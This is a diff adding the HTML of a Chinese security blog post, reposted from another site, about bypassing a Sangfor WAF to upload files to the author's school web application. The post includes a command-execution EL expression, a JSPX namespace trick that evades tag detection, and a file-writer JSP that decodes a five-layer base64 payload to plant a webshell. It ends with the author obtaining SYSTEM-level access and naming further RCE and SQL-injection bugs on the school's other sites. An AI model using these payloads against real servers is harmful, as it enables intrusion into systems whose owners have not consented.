@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>记一次绕过waf的任意文件上传 | Fstraw Blog</title><meta name="keywords" content="Bypass,WAF"><meta name="author" content="Fstraw"><meta name="copyright" content="Fstraw"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="推荐：绕过了深信服 waf 实现文件上传，正斜杠绕过文件名检测，使用 jspx 命名空间绕过内容检测，获取网站路径，最后加密写入 webshell。绕过waf是现在文件上传的常态了。 转载自：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;11337  前言前几天对自己学校进行的一次渗透测试，由于深信服过于变态，而且拦截会直接封ip，整个过程有点曲折 期间进行了后缀名绕过，jspx命名空间绕过、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次绕过waf的任意文件上传">
+<meta property="og:url" content="https://ccc-f.github.io/posts/63996aa.html">
+<meta property="og:site_name" content="Fstraw Blog">
+<meta property="og:description" content="推荐：绕过了深信服 waf 实现文件上传，正斜杠绕过文件名检测，使用 jspx 命名空间绕过内容检测，获取网站路径，最后加密写入 webshell。绕过waf是现在文件上传的常态了。 转载自：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;11337  前言前几天对自己学校进行的一次渗透测试，由于深信服过于变态，而且拦截会直接封ip，整个过程有点曲折 期间进行了后缀名绕过，jspx命名空间绕过、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ccc-f.github.io/img/backup.jpg">
+<meta property="article:published_time" content="2022-11-03T15:03:50.866Z">
+<meta property="article:modified_time" content="2023-04-28T09:21:02.943Z">
+<meta property="article:author" content="Fstraw">
+<meta property="article:tag" content="Bypass">
+<meta property="article:tag" content="WAF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ccc-f.github.io/img/backup.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://ccc-f.github.io/posts/63996aa"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="google3c676eb36348f5df"/><meta name="baidu-site-verification" content="de191936ea3ee4fffaba389d103fb230"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.1.1/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/js/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?32fff2d27aa7e0c7fad7396cabeaa45b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"已经超过","messageNext":"天，自上次更新后，文章内容可能已经过时。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":300,"languages":{"author":"作者: Fstraw","link":"链接: ","source":"来源: Fstraw Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '记一次绕过waf的任意文件上传',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-28 17:21:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/butterflyChange/css/myfont.css"<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Fstraw Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">123</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backup.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fstraw Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">记一次绕过waf的任意文件上传<a class="post-edit-link" href="https://github.com/ccc-f/ccc-f.github.io/edit/master/posts/63996aa.html" rel="external nofollow noreferrer" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-03T15:03:50.866Z" title="发表于 2022-11-03 23:03:50">2022-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-28T09:21:02.943Z" title="更新于 2023-04-28 17:21:02">2023-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">970</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="记一次绕过waf的任意文件上传"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/63996aa.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/63996aa.html" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>推荐：绕过了深信服 waf 实现文件上传，正斜杠绕过文件名检测，使用 jspx 命名空间绕过内容检测，获取网站路径，最后加密写入 webshell。绕过waf是现在文件上传的常态了。</p>
+<p>转载自：<strong><a target="_blank" rel="noopener external nofollow noreferrer" href="https://xz.aliyun.com/t/11337">https://xz.aliyun.com/t/11337</a></strong></p>
+</blockquote>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>前几天对自己学校进行的一次渗透测试，由于深信服过于变态，而且拦截会直接封ip，整个过程有点曲折</p>
+<p>期间进行了后缀名绕过，jspx命名空间绕过、获取网站根目录、base64五层编码写入shell等操作</p>
+<h1 id="0x01-获取网站接口"><a href="#0x01-获取网站接口" class="headerlink" title="0x01 获取网站接口"></a><strong>0x01 获取网站接口</strong></h1><p>主界面:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640.png" alt="图片"></p>
+<p>上传点:</p>
+<p>由于该应用是内嵌企业微信的套皮Html，所以我们首先用Burp Suite抓包获取接口和cookie</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789341917.png" alt="图片"></p>
+<p>任意文件上传:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342018.png" alt="图片"></p>
+<p>文件名强制命名为code+学号，后缀为最后一次点号出现之后的字母</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="0x02-后缀名绕过"><a href="#0x02-后缀名绕过" class="headerlink" title="0x02 后缀名绕过"></a><strong>0x02 后缀名绕过</strong></h1><p>代码不限制后缀名，但是waf限制呀！</p>
+<p>后缀名jsp，jspx会拦截，但是jspp，jspxx等不会拦截</p>
+<p>所以要利用windows特性绕过，常规的绕过手法例如末尾加点号、::$DATA均无法绕过</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342019.jpeg" alt="图片"></p>
+<p>经过fuzz，发现正斜杠可以绕过</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342020.png" alt="图片"></p>
+<h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="0x03-内容绕过"><a href="#0x03-内容绕过" class="headerlink" title="0x03 内容绕过"></a><strong>0x03 内容绕过</strong></h1><p>常见的jsp标记均无法绕过</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342021.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342022.png" alt="图片"></p>
+<p>所以我们得绕过JSP标记检测，这里参考了yzddmr6师傅的两种 <strong>绕过方法</strong>：</p>
+<ul>
+<li>jspEL表达式绕过</li>
+<li>jspx命名空间绕过</li>
+</ul>
+<p><strong>第一种是利用${}标记</strong>：</p>
+<p>payload：${Runtime.getRuntime().exec(request.getParameter(“x”))}</p>
+<p>但深信服waf过滤了一句话，需要变形绕过</p>
+<p>鄙人太菜了，不了解相关函数的变形绕过，所以选择第二种写法</p>
+<p><strong>第二种是利用命名空间的特性</strong>：</p>
+<p>参照yzddmr6师傅的图：</p>
+<p>使用自定义的命名空间，替换掉jsp的关键字</p>
+<p>将原本的<a href="jsp:scriptlet" rel="external nofollow noreferrer">jsp:scriptlet</a>替换成&lt;自定义字符:scriptlet&gt;</p>
+<p>这样waf的正则匹配不到<a href="jsp:scriptlet" rel="external nofollow noreferrer">jsp:scriptlet</a>自然就会放行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;hi xmlns:hi=&quot;http://java.sun.com/JSP/Page&quot;&gt;</span><br><span class="line">    &lt;hi:scriptlet&gt;</span><br><span class="line">        out.println(30*30);</span><br><span class="line">    &lt;/hi:scriptlet&gt;</span><br><span class="line">&lt;/hi&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342123.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342124.jpeg" alt="图片"></p>
+<h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1><h1 id="0x04-获取网站路径"><a href="#0x04-获取网站路径" class="headerlink" title="0x04 获取网站路径"></a><strong>0x04 获取网站路径</strong></h1><p>这里我们不能用相对路径来写入webshell</p>
+<p>因为Tomcat与Apache不同，根目录并不是以代码运行位置决定所在的目录，而是默认为Tomcat&#x2F;bin作为根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 获取当前的根目录</span><br><span class="line">String path = System.getProperty(&quot;user.dir&quot;);</span><br><span class="line">out.println(path);</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342125.jpeg" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 获取web项目所在的目录</span><br><span class="line">String path = application.getRealPath(&quot;test.jsp&quot;);</span><br><span class="line">out.println(path);</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342126.jpeg" alt="图片"></p>
+<p>所以写入shell的绝对路径应为D:&#x2F;tomcat8&#x2F;webapps&#x2F;declare&#x2F;static&#x2F;upload&#x2F;test.jsp</p>
+<h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><h1 id="0x05-编码或加密绕过waf写入shell"><a href="#0x05-编码或加密绕过waf写入shell" class="headerlink" title="0x05 编码或加密绕过waf写入shell"></a><strong>0x05 编码或加密绕过waf写入shell</strong></h1><p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;hi xmlns:hi=&quot;http://java.sun.com/JSP/Page&quot;&gt;</span><br><span class="line">    &lt;hi:directive.page import=&quot;java.util.Base64,java.io.*&quot;/&gt;</span><br><span class="line">    &lt;hi:scriptlet&gt;</span><br><span class="line">        File file = new File(&quot;D:/tomcat8/webapps/declare/static/upload/test.jsp&quot;);</span><br><span class="line">        FileWriter fileOut = new FileWriter(file);</span><br><span class="line">        Base64.Decoder base64 = Base64.getDecoder();</span><br><span class="line">        byte[] str = base64.decode(base64.decode(base64.decode(base64.decode(base64.decode(request.getParameter(&quot;x&quot;).getBytes(&quot;utf-8&quot;))))));</span><br><span class="line">        try &#123;</span><br><span class="line">            fileOut.write(new String(str, &quot;utf-8&quot;));</span><br><span class="line">            out.println(&quot;写入成功&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (fileOut != null) &#123;</span><br><span class="line">                    fileOut.close();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/hi:scriptlet&gt;</span><br><span class="line">&lt;/hi&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一开始我是用两层base64编码，还是被检测了，经过fuzz发现五层编码即可绕过</p>
+<p>鄙人太懒了，不想重新造轮子。如果各位师傅有时间的话，遇到这种waf建议用RSA、AES等加密算法绕过</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342127.png" alt="图片"></p>
+<p>成功getshell，System权限</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342128.jpeg" alt="图片"></p>
+<p>看了一眼依赖，可能存在log4j2和jackson的RCE，留着下次当靶场继续测试</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342229.png" alt="图片"></p>
+<h1 id="-4"><a href="#-4" class="headerlink" title=""></a></h1><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a><strong>0x06 总结</strong></h1><p>深信服的waf算挺强了，而且也足够恶心，检测可疑行为直接封ip，光是fuzz就用掉了快30个ip了</p>
+<p>学校其他站点有thinkphp5.0.23 RCE、泛微8.0前台sql注入的漏洞，但都有这个waf，实在没有耐心一个个fuzz</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Bypass/">Bypass</a><a class="post-meta__tags" href="/tags/WAF/">WAF</a></div><div class="post_share"><div class="social-share" data-image="/img/backup.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/js/social-share.min.css" media="print" onload="this.media='all'"><script src="/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/c903e70a.html"><img class="prev-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">记第一次机房渗透测试&amp;复盘</div></div></a></div><div class="next-post pull-right"><a href="/posts/1a462f01.html"><img class="next-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">网络安全工具集合</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/94237e26.html" title="从Certutil下载绕过探究常见杀软的绕过思路"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">从Certutil下载绕过探究常见杀软的绕过思路</div></div></a></div><div><a href="/posts/7a479159.html" title="文件重命名Getshell"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">文件重命名Getshell</div></div></a></div><div><a href="/posts/5a4257e.html" title="红队攻击-绕过waf以及IDS等流量设备"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">红队攻击-绕过waf以及IDS等流量设备</div></div></a></div><div><a href="/posts/c5347700.html" title="js逆向之远程调用(rpc)免去抠代码补环境"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-06</div><div class="title">js逆向之远程调用(rpc)免去抠代码补环境</div></div></a></div><div><a href="/posts/dd427bdc.html" title="绕过阿里云WAF"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">绕过阿里云WAF</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E6%8E%A5%E5%8F%A3"><span class="toc-number">2.</span> <span class="toc-text">0x01 获取网站接口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%90%8E%E7%BC%80%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">0x02 后缀名绕过</span></a></li><li class="toc-item 